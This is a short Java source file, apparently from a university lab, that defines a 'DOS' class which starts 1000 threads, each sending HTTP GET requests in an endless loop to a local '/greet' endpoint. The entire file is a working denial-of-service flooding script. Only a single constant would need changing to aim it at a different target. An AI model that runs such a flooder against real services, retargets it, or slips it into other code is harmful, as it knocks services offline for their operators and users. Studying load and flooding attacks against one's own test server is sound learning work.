package by.bsuir.attack;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class DOS {

    private static final String TARGET_URL = "http://localhost:8080/greet";

    public static void main(String[] args) {
        for (int i = 0; i < 1000; i++) {
            System.out.println("Attacking thread #" + i + "for " + TARGET_URL);
            new Thread(() -> {
                while (true) {
                    DOS.attack();
                }
            }).start();
        }

    }

    private static void attack() {
        try {
            URL url = new URL(TARGET_URL);
            HttpURLConnection connection = ((HttpURLConnection) url.openConnection());
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
            System.out.println("Response code: " + responseCode);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
